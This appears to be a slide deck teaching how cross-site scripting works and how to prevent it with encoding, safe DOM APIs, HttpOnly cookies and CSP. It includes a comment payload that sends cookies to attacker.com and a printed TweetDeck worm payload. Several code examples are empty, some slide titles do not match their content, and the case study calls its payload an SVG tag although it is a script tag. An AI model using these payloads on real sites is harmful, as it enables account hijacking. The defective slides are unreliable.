slides.title: Introduction to Cross-Site Scripting (XSS)
slides.content:
# Cross-Site Scripting (XSS) 🕷️

**Cross-Site Scripting (XSS)** is an injection vulnerability that occurs when a web application takes untrusted user input and renders it directly into a web page without adequate validation or encoding.

This allows malicious actors to inject client-side scripts (typically JavaScript) into web pages viewed by other users.

## What Attackers Can Do With XSS

- 🍪 **Steal Session Cookies**: Hijack legitimate logged-in user accounts.
- 🎣 **Phishing & UI Redirection**: Inject fake login forms over real banking sites.
- ⚡ **Perform Actions as the Victim**: Post status updates, transfer money, change passwords.
- ⌨️ **Keystroke Logging**: Record everything the victim types.
- 📸 **Webcam & Location Access**: Abuse browser device permissions.

slides.title: The Three Types of XSS
slides.content:
# The Three Categories of XSS 📐

XSS attacks fall into three primary categories based on how the malicious payload reaches the victim's browser:

## 1. Stored XSS (Persistent)
The malicious script is permanently stored in the application's database (e.g. forum post, user profile bio, comment).

## 2. Reflected XSS (Non-Persistent)
The malicious script is reflected off the web server in an immediate HTTP response (e.g. search term, error message in URL parameter).

## 3. DOM-Based XSS (Client-Side)
The vulnerability exists entirely in client-side JavaScript that writes untrusted data into the Document Object Model (DOM) using unsafe sinks like `innerHTML`.

slides.title: Stored XSS (Persistent XSS)
slides.content:
# Stored XSS (Persistent) 💾

Stored XSS is the most dangerous form of XSS because a single payload can infect thousands of victims automatically.

## Attack Scenario: The Malicious Blog Comment

1. Attacker posts a comment containing JavaScript:
   ```html_not
   Great article! <script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>
   ```
2. The server blindly saves this string into the comments database table.
3. An innocent visitor (or site administrator) views the article.
4. The server outputs the comment into the HTML page.
5. The victim's browser parses the `<script>` tag as executable code and transmits their session cookie directly to the attacker!

slides.title: Reflected XSS (Non-Persistent)
slides.content:
# Reflected XSS 🪞 In Reflected XSS, the payload travels from the request directly into the immediate response without being stored in a database. ## Attack Scenario: The Search Page 1. A website has a search feature: `https://site.com/search?q=laptops`. 2. The server outputs: `

Search results for: laptops

`. 3. If the server does not encode the query parameter, the attacker crafts a malicious link: ```http_not https://site.com/search?q= ``` 4. The attacker tricks a victim into clicking this link via email or social media. 5. The server echoes the script into the page, executing in the context of the victim's session!

slides.title: DOM-Based XSS
Dangerous Sinks & Safe Alternatives
slides.content:
# Dangerous Sinks vs Safe DOM APIs 🛡️

Audit your frontend JavaScript for dangerous sinks and replace them with safe property setters.

## Dangerous Sinks (Avoid!) ❌

- `element.innerHTML = userInput;`
- `element.outerHTML = userInput;`
- `document.write(userInput);`
- `eval(userInput);`
- `setTimeout(userInput, 1000);`

## Safe DOM Alternatives (Use!) ✅

- `element.textContent = userInput;` (Treats input strictly as text, never code!)
- `element.innerText = userInput;`
- `element.setAttribute('data-id', userInput);`

slides.title: Prevention: HTML Sanitization with DOMPurify
Modern Frontend Framework Protections
slides.content:
# How React, Vue & Angular Protect You 🛡️ Modern frontend frameworks automatically encode data bound to templates by default. ## React's Automatic Protection ```javascript_not // React automatically escapes string values: const title = ""; return

{title}

; // SAFE: React renders literal string! ``` ## The Framework Escape Hatches (Danger Zone!) Frameworks provide explicit, deliberately scary escape hatches when raw HTML is required: - React: `dangerouslySetInnerHTML={{ __html: sanitize(data) }}` - Vue: `v-html="sanitize(data)"` - Angular: `[innerHTML]="data"` (with `DomSanitizer`) > ⚠️ **Rule:** Whenever using these escape hatches, always sanitize with DOMPurify first!

slides.title: Protecting Cookies with HttpOnly
slides.content:
# Mitigating Cookie Theft: `HttpOnly` Flag 🍪

The primary objective of most XSS attacks is stealing authentication session cookies via `document.cookie`.

## The `HttpOnly` Directive

When a web server sets a cookie with the `HttpOnly` flag, the browser **completely forbids client-side JavaScript from accessing it**:

```http_not
Set-Cookie: session_id=abc123xyz; Secure; HttpOnly; SameSite=Strict
```

Even if an attacker finds an XSS vulnerability on your site, `document.cookie` will return an empty string and the attacker cannot steal your session token!

slides.title: Content Security Policy (CSP) as a Safety Net
slides.content: # Content Security Policy (CSP) for XSS Defense 📜 **Content Security Policy (CSP)** is an HTTP response header that restricts where scripts can be loaded and executed from. ## A Robust Anti-XSS CSP Policy ```http_not Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none'; ``` ## What this CSP Blocks: - ❌ Inline scripts like `` - ❌ Inline event handlers like `` - ❌ Scripts loaded from untrusted third-party domains (`https://evil.com/hack.js`) - ❌ String evaluation like `eval()`

slides.title: Input Validation vs Output Encoding
slides.content:
# Input Validation vs Output Encoding ⚖️

Security engineers enforce both, but understand their different purposes:

## Input Validation (Allowlisting)

- Reject data that doesn't conform to expected formats (e.g. email must match regex, age must be integer).
- **Limitation**: Cannot prevent XSS alone because names like `O'Connor` or mathematical text contain quotes or brackets.

## Output Encoding (Contextual)

- Formats data so the browser's HTML parser treats it strictly as display characters.
- **The Golden Rule**: Validate on input; Encode on output!

slides.title: Real-World Vulnerability Case Study: TweetDeck Worm
slides.content:
# Case Study: The 2014 TweetDeck XSS Worm 🐛

In June 2014, a teenager discovered an XSS vulnerability in Twitter's TweetDeck desktop client.

## The Payload

A tweet containing an SVG tag was posted:

```html_not
<script class="xss">$(".xss").parents().eq(1).find("a").eq(1).click();$('[data-action=retweet]').click();alert('XSS in Tweetdeck')</script>♥
```

## The Propagation Effect

Whenever any TweetDeck user scrolled past this tweet in their feed, the script executed automatically in their client, silently retweeting the exact same payload to all their followers!

Within minutes, the self-propagating worm was retweeted **over 40,000 times**, forcing Twitter to take TweetDeck offline temporarily.

slides.title: XSS Remediation Checklist
slides.content:
# XSS Remediation Checklist 📋

- [x] **Store auth tokens in `HttpOnly; Secure` cookies**: Never store sensitive tokens in `localStorage`.
- [x] **Sanitize user HTML with DOMPurify**: Clean rich-text inputs before rendering.
- [x] **Use safe DOM APIs**: Use `textContent` instead of `innerHTML`.
- [x] **Deploy a strict Content Security Policy**: Disallow `'unsafe-inline'`.
- [x] **Leverage framework template escaping**: Avoid bypasses like `dangerouslySetInnerHTML`.

slides.title: Summary: Cross-Site Scripting
slides.content:
# Cross-Site Scripting (XSS): Summary 📋

## Key Takeaways
- **Three Types**: Stored (database), Reflected (URL parameters), and DOM-based (client sinks).
- **Dangerous Sinks**: `innerHTML`, `outerHTML`, and `document.write` execute untrusted code.
- **Output Encoding**: Encodes `< > & " '` to neutralize malicious markup.
- **DOMPurify**: Essential for sanitizing allowed rich-text HTML.
- **Defense in Depth**: Pair encoding with `HttpOnly` cookie flags and Content Security Policy.
